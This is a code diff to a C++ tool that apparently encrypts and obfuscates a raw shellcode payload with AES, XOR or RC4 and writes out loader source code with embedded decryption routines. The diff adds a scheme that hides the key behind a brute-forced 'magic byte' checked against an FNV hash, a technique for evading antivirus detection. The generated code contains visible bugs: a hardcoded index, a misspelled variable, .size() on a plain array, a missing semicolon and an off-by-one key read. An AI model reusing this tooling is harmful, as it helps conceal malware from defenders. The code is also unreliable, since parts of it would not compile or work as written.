@@ -73,6 +73,15 @@ std::vector<unsigned char> GenerateKey(DWORD KeySize)
 }
 
 
+// Fowler–Noll–Vo hash function for 1 byte
+uint32_t FowlerNollVo(unsigned char oneByte)
+{   
+    const uint32_t Prime = 0x01000193;
+    const uint32_t Hash = 0x811C9DC5;
+    return (Hash ^ oneByte)* Prime;
+}
+
+
 // ---------------------------------------------------------------------------
 // ########################## UUIDfuscation ##################################
 
@@ -350,17 +359,29 @@ void EncryptAES(SIZE_T file_size, unsigned char* payload, FILE* file, DWORD KeyS
     std::vector <unsigned char> Key_init = GenerateKey(KeySize);
     std::vector <unsigned char> IV_init = GenerateKey(KeySize);
     
-    const unsigned char* Key = Key_init.data();
-    const unsigned char* IV = IV_init.data();
+    unsigned char* Key = Key_init.data();
+    unsigned char* IV = IV_init.data();
 
     // Encrypt the payload using the generated key and IV
     AES_ctx ctx = { 0 };
     AES_init_ctx_iv(&ctx, Key, IV);
     AES_CBC_encrypt_buffer(&ctx, payload, file_size);
 
-    // Write the key
-    fprintf(file, "\nunsigned char key[%d] = {", (int)Key_init.size());
-    for (int i = 0; i < Key_init.size(); i++) 
+    // Select one of the keys' bytes to be the magic byte
+    int randNum = rand() % ((int)Key_init.size() + 1);
+    unsigned char MagicByte = Key_init[randNum];
+
+    // Encrypt the key with the magic byte
+    for (int i = 0; i < Key_init.size(); i++)
+    {
+        Key[i] = ((Key[i] + i) ^ MagicByte);
+    }
+
+    // Write the encrypted key and FNV hash of the magic byte
+    fprintf(file, "\nuint32_t MagicByte = 0x%x;\n", FowlerNollVo(MagicByte));
+    fprintf(file, "\nunsigned char Key[%d] = {}\n", (int)Key_init.size());
+    fprintf(file, "\nunsigned char EncryptedKey[%d] = {", (int)Key_init.size());
+    for (int i = 0; i < Key_init.size(); i++)
     {
         fprintf(file, "0x%x, ", Key[i]);
     }
@@ -373,6 +394,12 @@ void EncryptAES(SIZE_T file_size, unsigned char* payload, FILE* file, DWORD KeyS
         fprintf(file, "0x%x, ", IV[i]);
     }
     fprintf(file, "};\n");
+
+    // Write the FNV function 
+    fprintf(file, "\nuint32_t FowlerNollVo(unsigned char oneByte)\n{\n\tconst uint32_t Prime = 0x01000193;\n\tconst uint32_t Hash = 0x811C9DC5;\n\treturn (Hash ^ oneByte) * Prime;\n}\n\n");
+
+    // Write the decryption function for the key and the payload
+    fprintf(file, "void DecryptKey()\n{\n\tunsigned char Counter = 0;\n\tint MagicBytePosition = %d;\n\n\twhile ((FowlerNollVo(EncryptedKey[7] ^ Counter) != MagicByte)\n\t{\n\t  Counter++;\n\t}\n\n\tfor (size_t i = 0; i < EncryptedKey.size(); i++)\n\t{\n\t\tKey[i] = ((Encryptedkey[i] ^ Counter) - i);\n\t}\n}\n", randNum);
 
     // Write the decryption function
     fprintf(file, "\nAES_ctx ctx = { 0 };\nAES_init_ctx_iv(&ctx, key, iv);\nAES_CBC_decrypt_buffer(&ctx, payload, sizeof(payload));\n");
@@ -388,7 +415,7 @@ void EncryptXOR(SIZE_T file_size, unsigned char* payload, FILE* file, DWORD KeyS
     // Generate a random key
     std::vector <unsigned char> Key = GenerateKey(KeySize);
 
-    // XOR with every byte of the key for hardening
+    // XOR with every byte of the key
     for (size_t i = 0, j = 0; i < file_size; i++, j++) 
     {
         if (j == Key.size()) 
@@ -398,16 +425,33 @@ void EncryptXOR(SIZE_T file_size, unsigned char* payload, FILE* file, DWORD KeyS
         payload[i] = payload[i] ^ Key[j];
     }
 
-    // Write the key
-    fprintf(file, "\nunsigned char key[%d] = {", (int)Key.size());
+    // Select one of the keys' bytes to be the magic byte
+    int randNum = rand() % ((int)Key.size() + 1);
+    unsigned char MagicByte = Key[randNum];
+
+    // Encrypt the key with the magic byte
     for (int i = 0; i < Key.size(); i++) 
     {
-        fprintf(file, "0x%x, ", Key[i]);
+        Key[i] = ((Key[i] + i) ^ MagicByte);
+    }
+
+    // Write the encrypted key and FNV hash of the magic byte
+    fprintf(file, "\nuint32_t MagicByte = 0x%x;\n", FowlerNollVo(MagicByte));
+    fprintf(file, "\nunsigned char Key[%d] = {}\n", (int)Key.size());
+    fprintf(file, "\nunsigned char EncryptedKey[%d] = {", (int)Key.size());
+    for (int i = 0; i < Key.size(); i++)
+    {   
+            fprintf(file, "0x%x, ", Key[i]);
     }
     fprintf(file, "};\n");
 
-    // Write the decryption function
+    // Write the FNV function 
+    fprintf(file, "\nuint32_t FowlerNollVo(unsigned char oneByte)\n{\n\tconst uint32_t Prime = 0x01000193;\n\tconst uint32_t Hash = 0x811C9DC5;\n\treturn (Hash ^ oneByte) * Prime;\n}\n\n");
+
+    // Write the decryption function for the key and the payload
+    fprintf(file, "void DecryptKey()\n{\n\tunsigned char Counter = 0;\n\tint MagicBytePosition = %d;\n\n\twhile ((FowlerNollVo(EncryptedKey[7] ^ Counter) != MagicByte)\n\t{\n\t  Counter++;\n\t}\n\n\tfor (size_t i = 0; i < EncryptedKey.size(); i++)\n\t{\n\t\tKey[i] = ((Encryptedkey[i] ^ Counter) - i);\n\t}\n}\n", randNum);
     fprintf(file, "\nfor (size_t i = 0, j = 0; i < file_size; i++, j++) {\n\tif (j == Key.size()) {\n\t\tj = 0;\n\t}\n\tpayload[i] = payload[i] ^ Key[j];\n}\n");
+    fprintf(file, "\n");
 }
 
 
@@ -458,29 +502,43 @@ void EncryptRC4(SIZE_T file_size, unsigned char* payload, FILE* file, DWORD KeyS
         printf("[!] SystemFunction032 FAILED With Error: 0x%0.8X \n", STATUS);
     }
 
-    // Write the key
-    fprintf(file, "\nunsigned char key[%d] = {", (int)Key.size());
+    // Select one of the keys' bytes to be the magic byte
+    int randNum = rand() % ((int)Key.size() + 1);
+    unsigned char MagicByte = Key[randNum];
+
+    // Encrypt the key with the magic byte
+    for (int i = 0; i < Key.size(); i++)
+    {
+        Key[i] = ((Key[i] + i) ^ MagicByte);
+    };
+
+    // Write the encrypted key and FNV hash of the magic byte
+    fprintf(file, "\nuint32_t MagicByte = 0x%x;\n", FowlerNollVo(MagicByte));
+    fprintf(file, "\nunsigned char Key[%d] = {}\n", (int)Key.size());
+    fprintf(file, "\nunsigned char EncryptedKey[%d] = {", (int)Key.size());
     for (int i = 0; i < Key.size(); i++)
     {
         fprintf(file, "0x%x, ", Key[i]);
     }
-    fprintf(file, "};\n\n");
+    fprintf(file, "};\n");
 
-    // Write the decryption function
+    // Write the FNV function 
+    fprintf(file, "\nuint32_t FowlerNollVo(unsigned char oneByte)\n{\n\tconst uint32_t Prime = 0x01000193;\n\tconst uint32_t Hash = 0x811C9DC5;\n\treturn (Hash ^ oneByte) * Prime;\n}\n\n");
+
+    // Write the decryption function for the key and the payload
+    fprintf(file, "void DecryptKey()\n{\n\tunsigned char Counter = 0;\n\tint MagicBytePosition = %d;\n\n\twhile ((FowlerNollVo(EncryptedKey[7] ^ Counter) != MagicByte)\n\t{\n\t  Counter++;\n\t}\n\n\tfor (size_t i = 0; i < EncryptedKey.size(); i++)\n\t{\n\t\tKey[i] = ((Encryptedkey[i] ^ Counter) - i);\n\t}\n}\n", randNum);
     fprintf(file, "typedef struct USTRING\n{\n   DWORD\tLength;\n   DWORD\tMaximumLength;\n   PVOID\tBuffer;\n}\n\ntypedef NTSTATUS(NTAPI* findSystemFunction032)(struct USTRING* Data, struct USTRING* Key);\n\nvoid DecryptRC4(DWORD KeySize, DWORD dPayloadSize, PVOID pPayload, PVOID pKey)\n{\n\n   NTSTATUS STATUS = NULL;\n\t\n   USTRING Data =\n   {\n      .Length = dPayloadSize,\n      .MaximumLength = dPayloadSize,\n      .Buffer = pPayload\n   };\n\n   USTRING UKey =\n   {\n      .Length = KeySize,\n      .MaximumLength = KeySize,\n      .Buffer = pKey\n   };\n\n   findSystemFunction032 SystemFunction032 = (findSystemFunction032)GetProcAddress(LoadLibraryA(\"Advapi32\"), \"SystemFunction032\");   if ((STATUS = SystemFunction032(&Data, &UKey)) != 0x0)\n   {\n       printf(\"[!] SystemFunction032 FAILED With Error: 0x%0.8X \\n\", STATUS);\n   }\n\n}\n\n");
-
 }
 
 
 // ---------------------------------------------------------------------------
-// ############################ Main #########################################
+// ############################# Main ########################################
 
 
 int main(int argc, char* argv[]) {
 
 
-    // Check if the correct number of arguments have been passed
-    if (argc != 5)
+    if (argc != 6)
     {
         std::cout << "\n[!] Usage: " << argv[0] << " <PayloadFile: payload.bin> <OutputFile: output.cpp> <EncryptionMethod: AES> <KeySizeInBytes: 16> <ObfuscationMethod: MAC>\n\n";
         return 1;
@@ -555,7 +613,6 @@ int main(int argc, char* argv[]) {
             return 1;
         }
     }
-
     else 
     {
         payload = new unsigned char[file_size];
